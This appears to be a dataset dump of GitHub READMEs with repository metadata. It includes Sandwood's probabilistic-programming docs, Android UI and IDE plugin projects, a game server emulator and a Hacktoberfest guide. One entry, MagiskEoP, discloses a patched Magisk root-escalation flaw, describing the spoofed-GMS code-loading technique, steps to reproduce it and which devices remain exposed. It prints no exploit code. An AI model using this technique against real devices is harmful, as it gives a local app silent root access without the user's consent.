* Calls to model parameter objects. Each named public variable in the model is represented by a corresponding field in the model object. Variables are public if they are declared in the outermost scope of the model and not labelled `private`, or are declared in an inner scope and are not labelled `public`. If a field is declared public in an inner iterative scope, for example the body of a for loop, the value from each iteration will be stored.

  The type of the object will depend on the variable. These can be split into 3 categories:
  1. Observed variables: These are scalar or array variables that are set by the user.
  2. Inferred variables: These are scalar or array variables inferred by the model.
  3. Random variables: These [Random Variables](https://en.wikipedia.org/wiki/Random_variable) declared as named fields in the model. These can only have their probability queried.

  Each of these fields references an object with a set of methods that allow the user to set and read values and properties from the parameter. Properties that can be set and read include the probability of the parameter, the retention policy of the parameter, and if the parameter should be fixed at its current value.

Some of the more important methods of the parameter object when performing model inference are:

  * getSamples to return sampled values.

  * getMAP to return the [Maximum A Posteriori](https://en.wikipedia.org/wiki/Maximum_a_posteriori_estimation) value.

  * setValue to allow a value to be set to a specific value.

  * setFixed which takes a `boolean` to mark the value as fixed, and therefore not to be updated during inference. It is important to set the value of the parameter before fixing it.
  
  * getLogProbability which gets the log probability of the variable after inferring probabilities.
    
There are more methods, and we recommend consulting the JavaDoc to familiarise yourself with them.

#### Model operations

There are 3 basic types of operation that can be performed on a model:

1. **Infer Values** Having set the value of some of the variables of a model, infer values for the remaining variables. For the results of this method to be of interest some of the inferred values will need to be recorded. This can be done by recording the inferred values for every unset variable in the model model, or just a subset of the variables. The retention policy can be set for the entire model by a call to the method `setRentionPolicy` in the model class. Optionally individual variables can then have their retention policy set by calls to the corresponding `setRetentionPolicy` method in each variable object.

There are 3 sampling policies:
  * _NONE_  records no values. This is particularly useful if one of the variables is large so taking the time and space to store it would be wasteful.

  * _SAMPLE_  records the value from every iteration of the inference algorithm, so if 1000 iterations are performed 1000 values will be sampled from the each variable set to this retention policy. This is useful for calculating the variance as well as the average value. There is a weakness to this though, if the positions of values within the model can move during the inference then the values cannot be averaged over. For example with a topic model topics 2 and 3 may swap places during the inference, so averaging all the values for topic 2 with produce a mixture of topic 2 and topic 3. To overcome this Maximum A Posteriori (MAP) is also provided as a retention policy.

  * _MAP_  or [Maximum A Posteriori (MAP)](https://en.wikipedia.org/wiki/Maximum_a_posteriori_estimation) records the values of the variables when the model is in its most probable state. This overcomes the issue with transient value positions meaning values cannot be averaged, but at the expense of being able to calculate bounds. This option also has space advantages if some of the variables are large.

Configuration: Additional method calls on the model object allow the user to set properties such as  _burnin_  and  _thinning_  when performing this inference step. Burnin ignores the values from the first  _n_  iterations allowing the model to move away from a low probability starting point before starting to sample. Thinning reduces the autocorrelation induced by the MCMC procedure by only considering the values from every  _n_ th iteration.

2. **Infer Probabilities** Having set the values of some or all the parameters in the model calculate the probability of generating those values. This can be calculated for each variable in the model and for the model as a whole. 

3. **Execute Model** Run the model as if it was regular code generating new values for any parameters that are not fixed by the user. An example of when this behaviour would be used is for a linear regression model. In this case the model coefficients would first be inferred using training data. Once they have been inferred they would be fixed and new input data set. The model would then be executed to generate the corresponding predictions for this new input data. This form of execution could also be used to generate representative synthetic data from a trained model.

**Construct and train a model**

```java
//Load inputs
int nStates = 25;
int[] actions = loadActions(....);
int nActions = maxActions(....);

//Construct the model
HMM model = new HMM(actions, nActions, nStates);

//Set the retention policies
model.setDefaultRetentionPolicy(RetentionPolicy.MAP);
model.st.setRetentionPolicy(RetentionPolicy.NONE);

//Pick a random number generator. The ones introduced in Java 17 are faster and better quality.
model.setRNGType(RandomType.L64X1024MixRandom);

//Instruct the model to use the ForkJoin framework for parallel execution.
model.setExecutionTarget(ExecutionTarget.forkJoin);

//Run 2000 inference steps to infer model values
model.inferValues(2000);

//Gather the results.
double[] initialState = model.initialState.getMAP();
double[][] bias = model.bias.getMAP();
double[][] transitions = model.m.getMAP();
```

**Construct model and infer probabilities**

```java
//Load inputs
int nStates = 25;
int[] actions = loadActions(....);
int nActions = maxActions(....);

//Load model parameters
double[][] bias = model.bias.getMAP();
double[][] transitions = model.m.getMAP();

//Construct the model
HMM model = new HMM(actions, nActions, nStates);

//Set and fix trained values
model.bias.setValue(bias);
Model.m.setValue(transitions);

//Run 2000 inference steps to infer probabilities
model.inferProbabilities(2000);

//Recover the probabilities of the model parameter actions.
double actionsProbability = model.actions.getProbability();

//Recover the probability of the model as a whole
double modelProbability = model.getProbability()
```

**Train and execute a Liner Regression model**

```java
//Load parameters
double[] xs = loadXs(....);
double[] ys = loadYs(....);

//Construct the model
LinearRegression model = new LinearRegression(xs, ys);
…
//Run 2000 inference steps to c, m, and sigma.
model.inferValues(2000);

//Fix the inferred values
model.c.setFixed(true);
model.m.setFixed(true);
model.sigma.setFixed(true);

//Set new input values
double[] new_xs = loadXs(....);
model.xs.setValue(new_xs);

//Run the model to generate sequences of actions using the inferred values
model.execute(1000);

//Recover the generated values
double[][] new_ys = model.ys.getSamples();
```

## Help
For help with Sandwood please start or join a discussion on the [discussions page](https://github.com/oracle/sandwood/discussions).

## Contributing
This project welcomes contributions from the community. Before submitting a pull
request, please [review our contribution guide](./CONTRIBUTING.md).

## Security

Please consult the [security guide](./SECURITY.md) for our responsible security
vulnerability disclosure process.

## License
Copyright (c) 2019-2024 Oracle and/or its affiliates.

Released under the Universal Permissive License v1.0 as shown at
<https://oss.oracle.com/licenses/upl/>.

",1,0,1,1.0,"['sandwood', 'what', 'probabilistic', 'programming', 'installation', 'command', 'line', 'tool', 'java', 'library', 'call', 'maven', 'plugin', 'documentation', 'example', 'model', 'sandwood', 'language', 'compile', 'model', 'use', 'compiled', 'model', 'construct', 'model', 'interact', 'model', 'model', 'operation', 'help', 'contribute', 'security', 'license']","['model', 'sandwood', 'what', 'probabilistic', 'programming']"
HChenX/HiMiuiX,master,"<div align=""center"">
<h1>HiMiuiX</h1>

![stars](https://img.shields.io/github/stars/HChenX/HiMiuiX?style=flat)
![Github repo size](https://img.shields.io/github/repo-size/HChenX/HiMiuiX)
![last commit](https://img.shields.io/github/last-commit/HChenX/HiMiuiX?style=flat)
![language](https://img.shields.io/badge/language-java-purple)

[//]: # (<p><b><a href=""README-en.md"">English</a> | <a href=""README.md"">简体中文</a></b></p>)
<p>仿 MiuiX 的 Preference Ui，xml式布局！</p>
</div>

### HiMiuiX

#### 包含:

- MiuiPreference
- MiuiAlertDialog
- MiuiDropDownPreference
- MiuiEditTextPreference
- MiuiSeekBarPreference
- MiuiSwitchPreference
- MiuiPreferenceCategory
- MiuiCardPreference
- 等.... 更多 Ui 正在构建ing

#### Demo 项目:

- [HiMiuiXDemo](https://github.com/HChenX/HiMiuiXDemo)
- 欢迎下载体验！

#### 展示:

- MiuiPreference
  ![MiuiPreference](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiPreference.jpg)
  ![MiuiPreference_dark](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiPreference_dark.jpg)

- MiuiSwitchPreference
  ![MiuiSwitchPreference](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiSwitchPreference.jpg)
  ![MiuiSwitchPreference1](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiSwitchPreference1.jpg)
  ![MiuiSwitchPreference_dark](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiSwitchPreference_dark.jpg)

- MiuiDropDownPreference
  ![MiuiDropDownPreference](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiDropDownPreference.jpg)
  ![MiuiDropDownPreference1](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiDropDownPreference1.jpg)
  ![MiuiDropDownPreference_dark](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiDropDownPreference_dark.jpg)

- MiuiEditTextPreference
  ![MiuiEditTextPreference](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiEditTextPreference.jpg)
  ![MiuiEditTextPreference_dark](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiEditTextPreference_dark.jpg)

- MiuiAlertDialog
  ![MiuiAlertDialog_edit](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiAlertDialog_edit.jpg)
  ![MiuiAlertDialog_edit_dark](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiAlertDialog_edit_dark.jpg)
  ![MiuiAlertDialog_items](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiAlertDialog_items.jpg)
  ![MiuiAlertDialog_items_dark](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiAlertDialog_items_dark.jpg)

- MiuiSeekBarPreference
  ![MiuiSeekBarPreference](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiSeekBarPreference.jpg)
  ![MiuiSeekBarPreference_dark](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiSeekBarPreference_dark.jpg)
  ![MiuiSeekBarPreference_dialog](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiSeekBarPreference_dialog.jpg)

- MiuiPreferenceCategory
  ![MiuiPreferenceCategory](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiPreferenceCategory.jpg)
  ![MiuiPreferenceCategory_dark](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiPreferenceCategory_dark.jpg)

- MiuiCardPreference
  ![MiuiCardPreference](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiCardPreference.jpg)
  ![MiuiCardPreference_dark](https://raw.githubusercontent.com/HChenX/HiMiuiX/master/image/MiuiCardPreference_dark.jpg)

### 使用

- 请做为模块在项目中导入使用！

```shell
  # 在你仓库中执行，将本仓库作为模块使用
  git submodule add https://github.com/HChenX/HiMiuiX.git
  # 后续拉取本模块仓库
  git submodule update --init
```

- 然后设置项目 settings.gradle 添加:

```groovy
include ':HiMiuiX'
```

- 最后设置项目 app 下 build.gradle 文件，添加:

```groovy
implementation(project(':HiMiuiX'))
```

- tip: 请确保导入并使用了 `com.android.library`

#### 开源许可

- 本 UI 是对 MiuiX 的仿制而来，在此感谢 MiuiX！
- 本项目遵循 GPL-3.0 开源协议。
- 使用本项目请在项目中注明！
",0,0,1,0.0,"['p', 'b', 'a', 'english', 'a', 'himiuix', 'demo']","['a', 'p', 'b', 'english', 'himiuix']"
gejun123456/HotSwapHelper,master,"## HotSwapHelper - IntelliJ Plugin Based on HotSwapAgent for Hot Code Swapping

[![Jetbrains Plugins](https://img.shields.io/jetbrains/plugin/v/25171-a8translate.svg)][plugin]  
[中文文档](https://github.com/gejun123456/HotSwapHelper/blob/master/README_CN.md)
### Usage Instructions

1. Visit [HotSwapHelper Releases](https://github.com/gejun123456/HotSwapHelper/releases) and download the JDK corresponding to your version.
2. After downloading, extract the files and configure IntelliJ IDEA to use the corresponding JDK.
3. Once HotSwapHelper is installed, two icons will appear next to the Debug button in IDEA. Click ""Debug with HotSwap"" to perform hot swap.
4. Check the logs for the appearance of `org.hotswap.agent.HotswapAgent`. If it appears, the agent has been successfully loaded.
5. After change code, need recompile the file or build the project(Ctrl+Shift+F9 or Ctrl+F9), then it will automatically hot swap.

### Supported Frameworks

#### DO not use rebuild module or rebuild project it will reload all classes and slow. only rebuild file or build module or build project.

#### Compile code not work. no error no log

1. make sure intellij setting `Build, Execution, Deployment/Debugger/HotSwap/Reload class after compilation is Always.

#### All plugins supported by HotSwapAgent are also supported by HotSwapHelper, including:
Spring Boot, Spring MVC, Hibernate, MyBatis, MyBatis-Plus, Log4j, etc. For more information, visit the [HotSwapAgent GitHub page](https://github.com/HotswapProjects/HotswapAgent).


#### java.lang.NoClassDefFoundError: org/hotswap/agent/config/PluginManage
Edit Configuration -> Shorten Command Line -> Jar manifest

### Open-Source Projects Tested Locally
Project Name | URL | Supported Features | Additional Notes
-----   |---| -----| -----
RuoYi | [https://github.com/yangzongzhuan/RuoYi](https://github.com/yangzongzhuan/RuoYi)  | Supports MyBatis XML hot-swapping and Java hot-swapping |
Jeecg | [https://github.com/jeecgboot/JeecgBoot](https://github.com/jeecgboot/JeecgBoot) | Supports MyBatis XML hot-swapping and Java hot-swapping |


### Common Question?

#### Why need to download a jdk?
The jdk provided by [HotSwapHelper Releases](https://github.com/gejun123456/HotSwapHelper/releases) has package 
dcevm with hotswap folder into it, so you don't need to install dcevm separately.
If you don't like it, you can always install by yourself from doc:[HotSwapAgent GitHub page](https://github.com/HotswapProjects/HotswapAgent).

#### java17 startUp issue java.nio.channels.ReadableByteChannel sun.nio.ch.ChannelInputStream.ch accessible: module java.base does not ""opens sun.nio.ch"" to unnamed module @8297b3a
Update to plugin 1.0.2 version, it has fixed.

### Encountering Issues?
Just issue on github or contact me following:  
You can contact me by joining the QQ group: [HotSwapHelper Plugin User Group](https://qm.qq.com/q/JQKyhlt4ke)  
Or send an email to: gejun123456@gmail.com  

### ScreenShot
![runAndDebug](https://raw.githubusercontent.com/gejun123456/HotSwapHelper/master/screenShot/DebugWithHotSwap.png)
![changeCodeAndWork](https://raw.githubusercontent.com/gejun123456/HotSwapHelper/master/screenShot/HotSwapHelperChangeCodeWork.gif)

[plugin]: https://plugins.jetbrains.com/plugin/25171
",1,8,1,0.0,"['hotswaphelper', 'intellij', 'plugin', 'base', 'hotswapagent', 'hot', 'code', 'swap', 'usage', 'instruction', 'support', 'framework', 'do', 'use', 'rebuild', 'module', 'rebuild', 'project', 'reload', 'class', 'slow', 'rebuild', 'file', 'build', 'module', 'build', 'project', 'compile', 'code', 'work', 'error', 'log', 'all', 'plugins', 'support', 'hotswapagent', 'also', 'support', 'hotswaphelper', 'include', 'project', 'test', 'locally', 'common', 'question', 'why', 'need', 'download', 'jdk', 'startup', 'issue', 'accessible', 'module', 'open', 'unnamed', 'module', 'encounter', 'issue', 'screenshot']","['module', 'support', 'rebuild', 'project', 'hotswaphelper']"
canyie/MagiskEoP,main,"## Introduction
This is an exploit for a vulnerability in Magisk app that allows a local app to silently gain root access without user consent. 

Vulnerability was initially reported by [@vvb2060](https://github.com/vvb2060) and PoC-ed by [@canyie](https://github.com/canyie). It has been fixed in Canary 27007.

Demo video for exploit this vulnerability to silently obtaining root privileges and granting root to any app: https://github.com/canyie/MagiskEoP/blob/main/screen-20220302-093745.mp4


Steps to reproduce this vulnerability:
1. Install vulnerable Magisk app builds on a device that has no GMS preinstalled
2. Install this exploit app
3. Force stop Magisk app and this exploit app
4. Open Magisk app
5. Open this exploit app, type your commands and press Execute to execute them with root privileges

## Vulnerability Info
Name: Magisk App Arbitrary Code Execution Vulnerability

Alias: Magisk Privilege Escalation Vulnerability

### The Basics
Product: Magisk

CVE: N/A (not yet assigned)

Reporter: [@vvb2060](https://github.com/vvb2060)

Initial Report Date: 2024-08-01

Patch Date: 2024-08-21

Disclosure Date: 2024-08-24

Affected Versions: Manager v7.0.0 ~ Canary 27006

First Patched Versions: Canary 27007

Issue/Bug report: https://github.com/topjohnwu/Magisk/issues/8279

Patch CL: https://github.com/topjohnwu/Magisk/commit/c2eb6039579b8a2fb1e11a753cea7662c07bec02

Bug-introducing CL: https://github.com/topjohnwu/Magisk/commit/920b60da19212dd8d54d27ada77a30067ce50de6

Bug Class: Unsafe Dynamic External Code Loading

Weakness Enumerations:
- [CWE-386: Symbolic Name not Mapping to Correct Object](https://cwe.mitre.org/data/definitions/386.html)
- [CWE-829: Inclusion of Functionality from Untrusted Control Sphere](https://cwe.mitre.org/data/definitions/829.html)

### Summary
Magisk is a suite of open source software for customizing Android. Prior to version canary 27007, in install of ProviderInstaller.java, there is a possible way to load arbitrary code into Magisk app due to a missing package validation. This could lead to local escalation of privileges allowing attackers to gain root access with no additional privileges needed. User interaction is not needed for exploitation.

### Details
Old Android versions do not support some algorithms. To make Magisk work properly on these platforms, it tries to load conscrypt from GMS by calling [createCallingContext()](https://developer.android.com/reference/android/content/Context#createPackageContext(java.lang.String,%20int)). Check this link for more details: https://t.me/vvb2060Channel/692

However, GMS is not always preinstalled on all devices. Magisk assumes that loading code from GMS is always safe, however attackers can create a fake malicious app with the same package name. When Magisk app is launched, malicious code will get executed in Magisk app. Since Magisk app is always granted root access, this allows attackers to silently gain root access and execute arbitrary code with root privileges without user acceptance.

### Vulnerable Devices
- Devices with no GMS preinstalled
- Devices with broken signature verification implementation (e.g. Disabled by CorePatch)

Note: This issue is fixed in Canary 27007 by ensuring GMS is a system app before loading it. However, it's still possible to exploit this issue on devices with pre-installed GMS but have broken signature verification implementations (e.g. CorePatch).

",0,0,1,0.0,"['introduction', 'vulnerability', 'info', 'the', 'basic', 'summary', 'detail', 'vulnerable', 'device']","['introduction', 'vulnerability', 'info', 'the', 'basic']"
siddharthsky/CustTermux,main,"<h1 align=""center"">
  <br>
  <a href="""">
    <img src=""_assets/logos/CustTermux-icon.png"" alt="""" width=""200"">
  </a>
  <br>
  📺 CustTermux
  <br>
</h1>


### 🙌 Acknowledgements

- [Termux](https://github.com/termux)
  - Project is based on Termux.
- [rabilrbl](https://github.com/rabilrbl)
  - This project uses [jiotv_go](https://github.com/rabilrbl/jiotv_go) as part of its implementation.
",12,1,2,23.0,['acknowledgement'],['acknowledgement']
hoangtien2k3/reactify,main,"<h3 align=""center"">
<img src=""docs/images/reactify_banner.png"" alt=""Ezbuy"" width=""300"" />

<a href=""https://github.com/hoangtien2k3/reactify/blob/main/docs/en/README.md"">📚Docs</a> |
<a href=""https://github.com/hoangtien2k3/reactify/blob/main/docs/en/README.md"">💬Chat</a> |
<a href=""https://github.com/hoangtien2k3/reactify/blob/main/docs/en/README.md"">✨Live Demo</a>
</h3>

##

Reactify [a commons Java lib]() with spring boot framework, Supports using keycloak, filter, trace log, cached, minio
server, exception handler, validate and call API with webclient

This README provides quickstart instructions on running [`reactify`]() on bare metal project spring boot.

[![SonarCloud](https://sonarcloud.io/images/project_badges/sonarcloud-white.svg)](https://sonarcloud.io/summary/new_code?id=hoangtien2k3_reactify)

[![CircleCI](https://circleci.com/gh/hoangtien2k3/reactify.svg?style=svg)](https://app.circleci.com/pipelines/github/hoangtien2k3/reactify)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=hoangtien2k3_reactify&metric=alert_status)](https://sonarcloud.io/summary/new_code?id=hoangtien2k3_reactify)
[![Lines of Code](https://sonarcloud.io/api/project_badges/measure?project=hoangtien2k3_reactify&metric=ncloc)](https://sonarcloud.io/summary/overall?id=hoangtien2k3_reactify)
[![GitHub Release](https://img.shields.io/github/v/release/hoangtien2k3/reactify?label=latest%20release)](https://mvnrepository.com/artifact/io.github.hoangtien2k3/reactify)
[![License](https://img.shields.io/badge/license-Apache--2.0-green.svg)](https://www.apache.org/licenses/LICENSE-2.0.html)
[![OpenSSF Best Practices](https://www.bestpractices.dev/projects/9383/badge)](https://www.bestpractices.dev/projects/9383)
[![Build status](https://github.com/ponfee/commons-core/workflows/build-with-maven/badge.svg)](https://github.com/hoangtien2k3/reactify/actions)

## Download
Gradle is the only supported build configuration, so just add the dependency to your project build.gradle file:

⬇️ Download Gradle and Maven

```kotlin
dependencies {
  implementation 'io.github.hoangtien2k3:reactify:$latest'
}
```

```maven
<dependency>
   <groupId>io.github.hoangtien2k3</groupId>
   <artifactId>reactify</artifactId>
   <version>${latest}</version>
</dependency>
```

The latest `reactify` version is: [![GitHub Release](https://img.shields.io/github/v/release/hoangtien2k3/reactify?label=latest)](https://mvnrepository.com/artifact/io.github.hoangtien2k3/reactify)

The latest stable lib `reactify` version is: latestVersion Click [here](https://central.sonatype.com/namespace/io.github.hoangtien2k3) for more information on reactify.

## Getting Started

1. Correct and complete setup to start the program `application.yml` or `application.properties`
   with [CONFIG](src/main/resources/application.yml)

2. The [reference documentation]() includes detailed [installation instructions]() as well as a
   comprehensive [getting started]() guide.

Here is a quick teaser of a complete Spring Boot application in Java:

```java
@SpringBootApplication
@ComponentScan(basePackages = {""io.hoangtien2k3.reactify.*""})
@ImportResource({""classpath*:applicationContext.xml""})
public class Example {

    @RequestMapping(""/"")
    String home() {
        return ""Hello World!"";
    }

    public static void main(String[] args) {
        SpringApplication.run(Example.class, args);
    }
}
```

## Contributing

If you would like to contribute to the development of this project, please follow our contribution guidelines.

![Alt](https://repobeats.axiom.co/api/embed/31a861bf21d352264c5c122808407abafb97b0ef.svg ""Repobeats analytics image"")


## Star History

<a href=""https://star-history.com/#hoangtien2k3/fw-commons&Timeline"">
 <picture>
   <source media=""(prefers-color-scheme: dark)"" srcset=""https://api.star-history.com/svg?repos=hoangtien2k3/fw-commons&type=Timeline&theme=dark"" />
   <source media=""(prefers-color-scheme: light)"" srcset=""https://api.star-history.com/svg?repos=hoangtien2k3/fw-commons&type=Timeline"" />
   <img alt=""Star History Chart"" src=""https://api.star-history.com/svg?repos=hoangtien2k3/fw-commons&type=Timeline"" />
 </picture>
</a>

## Contributors ✨

<a href=""https://github.com/hoangtien2k3/reactify/graphs/contributors"">
  <img src=""https://contrib.rocks/image?repo=hoangtien2k3/reactify"" />
</a>

## License

This project is licensed under the [Apache License, Version 2.0](https://www.apache.org/licenses/LICENSE-2.0)

```
Apache License
Copyright (c) 2024 Hoàng Anh Tiến
```
",6,0,15,1.0,"['download', 'get', 'start', 'contribute', 'star', 'history', 'contributor', 'license']","['download', 'get', 'start', 'contribute', 'star']"
iw2d/kinoko,main,"## Kinoko
Kinoko is a server emulator for the popular mushroom game.


## Setup
Basic configuration is available via environment variables - the names and default values of the configurable options are defined in [ServerConstants.java](src/main/java/kinoko/server/ServerConstants.java) and [ServerConfig.java](src/main/java/kinoko/server/ServerConfig.java).

> [!NOTE]
> Client WZ files are expected to be present in the `wz/` directory in order for the provider classes to extract the required data. The required files are as follows:
> ```
> Character.wz
> Item.wz
> Skill.wz
> Morph.wz
> Map.wz
> Mob.wz
> Npc.wz
> Reactor.wz
> Quest.wz
> String.wz
> Etc.wz
> ```

#### Java setup
Building the project requires Java 21 and maven.

```bash
# Build jar
$ mvn clean package
```


#### Database setup
It is possible to use either CassandraDB or ScyllaDB, no setup is required other than starting the database.
```bash
# Start CassandraDB
$ docker run -d -p 9042:9042 cassandra:5.0.0

# Alternatively, start ScyllaDB
$ docker run -d -p 9042:9042 scylladb/scylla --smp 1
```
You can use [Docker Desktop](https://www.docker.com/products/docker-desktop/) or WSL on Windows.


#### Docker setup
Alternatively, docker can be used to build and start the server and the database using the [docker-compose.yml](docker-compose.yml) file. The requirements are as follows:
- docker : required for building and running the server and database containers
- cqlsh : required for the health check for the database container

```bash
# Build and start containers
$ docker compose up -d
```
",0,9,1,7.0,"['kinoko', 'setup', 'java', 'setup', 'build', 'jar', 'database', 'setup', 'start', 'cassandradb', 'alternatively', 'start', 'scylladb', 'docker', 'setup', 'build', 'start', 'container']","['setup', 'start', 'build', 'kinoko', 'java']"
Vanshikapandey30/Hacktoberfest2024,main,"![image](https://github.com/user-attachments/assets/a6aee016-71e8-4f04-9e8e-1ed57761959b)

Link to Register: https://hacktoberfest.com/

You can check the label of this Repo by going to: Pull Requests -> Labels

What can I contribute?

-DSA codes in any language.

-React for Beginners

Create a separate directory for each contribution.
## Contribution Instructions
The simple contribution instructions are:

- Star ⭐ & Fork 🍴 this Repository.
- Create a directory under your GitHub Username.
- Inside the directory, please have the list of static files.
- Create a pull request using the PR template given.

All the best for your Hacktoberfest Journey!

## How to start Contributing and pull request

**1.**  Fork [this](https://github.com/Vanshikapandey30/HacktoberFest2024.git) repository.

**2.**  Clone your forked copy of the project.

```
git clone --depth 1 https://github.com/<your_name>/HactoberFest2024
```

**3.** Navigate to the project directory :file_folder: .

```
cd HacktoberFest2024
```

**4.** Add a reference(remote) to the original repository.

```
git remote add upstream https://github.com/Vanshikapandey30/HacktoberFest2024.git
```

**5.** Check the remotes for this repository.
```
git remote -v
```

**6.** Always take a pull from the upstream repository to your master branch to keep it at par with the main project(updated repository).

```
git pull upstream main
```

**7.** Create a new branch.

```
git checkout -b <your_branch_name>
```

**8.** Perform your desired changes to the code base.


**9.** Track your changes:heavy_check_mark: .

```
git add . 
```

**10.** Commit your changes .

```
git commit -m ""Relevant message""
```

**11.** Push the committed changes in your feature branch to your remote repo.
```
git push -u origin <your_branch_name>
```

**12.** To create a pull request, click on `compare and pull requests`. Please ensure you compare your feature branch to the desired branch of the repository you are supposed to make a PR to.


**13.** Add appropriate title and description to your pull request explaining your changes and efforts done.


**14.** Click on `Create Pull Request`.


**15** Voila!

## Contribute
Contributions are welcome! 

## Rules
- Pull requests can be submitted to any opted-in repository on GitHub or GitLab.
- The pull request must contain commits you made yourself.
- If a maintainer reports your pull request as spam, it will not be counted toward your participation in Hacktoberfest.
- If a maintainer reports behavior that’s not in line with the project’s code of conduct, you will be ineligible to participate.
- To get a shirt, you must make four approved pull requests (PRs) on opted-in projects between October 1-31 in any time zone.
- This year, the first 55,000 participants can earn a T-shirt.

A repository/project is considered to be participating in Hacktoberfest if the 'hacktoberfest' topic is present and is accepting public contributions via pull requests. An individual pull request can also be opted-in directly by adding the 'hacktoberfest-accepted' label.

A pull request is considered approved once it has an overall approving review from maintainers, or has been merged by maintainers, or has been given the 'hacktoberfest-accepted' label. A pull request with any label containing the word 'spam' or 'invalid' will be considered ineligible for Hacktoberfest.
",0,25,1,105.0,"['contribution', 'instruction', 'how', 'start', 'contributing', 'pull', 'request', 'contribute', 'rule']","['contribution', 'instruction', 'how', 'start', 'contributing']"
